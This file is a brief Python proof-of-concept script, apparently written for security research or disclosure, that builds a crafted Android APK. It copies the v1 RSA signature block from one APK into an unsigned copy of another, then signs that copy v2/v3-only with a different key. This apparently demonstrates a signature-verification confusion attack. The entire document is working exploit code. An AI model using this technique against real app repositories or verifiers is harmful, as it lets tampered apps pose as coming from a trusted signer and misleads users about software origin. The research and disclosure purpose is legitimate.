#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import apksigcopier
import apksigtool
import zipfile


with zipfile.ZipFile("fake.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(info.filename)
            meta = [(info, zf.read(info.filename))]
            break

date_time = apksigcopier.copy_apk("app.apk", "poc-unsigned.apk")
apksigcopier.patch_meta(meta, "poc-unsigned.apk", date_time=date_time)

apksigtool.do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
                   key="privkey-rsa.der", no_v1=True)
